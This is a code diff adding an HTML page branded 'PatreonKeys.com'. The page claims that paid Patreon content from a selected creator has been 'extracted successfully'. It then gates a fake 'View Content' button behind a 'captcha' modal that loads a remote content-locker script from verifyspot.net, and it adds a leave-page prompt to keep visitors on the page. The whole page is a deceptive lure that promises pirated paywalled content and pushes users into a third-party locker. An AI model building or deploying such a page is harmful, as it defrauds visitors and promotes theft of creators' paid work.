@@ -1,0 +1,44 @@
+<html>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <title> PatreonKeys.com </title>
+    <link rel="stylesheet" type="text/css" href="files/style.css">
+    <link rel="shortcut icon" type="image/png" href="files/favicon.png"/>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.0.2/jquery.min.js"></script>
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,500,900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">
+  </head>
+  <body>
+    <h1>Completed</h1>
+    <div class="image animated fadeInLeft"><img alt="creator_icon" class="icon" src="files/creator.png" width="55rem" height="55rem"></div><span><a>Content is ready</a><br><b>Paid content from selected user has been extracted successfully</b></span><br><br>
+	<div class="image animated fadeInLeft"><img alt="videos_icon" class="icon" src="files/videos.png" width="55rem" height="55rem"></div><span><a>About video preview</a><br><b>Please be patient, large videos might take a while to load</b></span><br><br>
+	<br><div class="animated fadeInUp" style="text-align:center;"><a id="myBtn" class="button">View Content</a></div>
+    <div id="myModal" class="modal">
+    <div class="modal-content">
+    <span class="close">&times;</span>
+    <p>Your content is ready!</p>
+	<p>Please verify using captcha to view it</p>
+    <br><br><div data-captcha-enable="true"></div><br><br>
+	<img alt="preview" class="preview" src="files/preview.jpg" width="150rem">
+    </div>
+    </div>
+    <script>
+    var modal = document.getElementById("myModal");
+    var btn = document.getElementById("myBtn");
+    var span = document.getElementsByClassName("close")[0];
+    btn.onclick = function() {
+      modal.style.display = "block";
+    }
+    span.onclick = function() {
+      modal.style.display = "none";
+    }
+    </script>
+    <script src="//www.verifyspot.net/captchalocker/js/captcha.js.php?id=0d15970a289e0e569d69de8160693fd0"></script>
+    <script>
+    window.onbeforeunload = function(){
+    return 'Are you sure you want to leave?';
+    };
+    </script>
+  </body>
+</html>
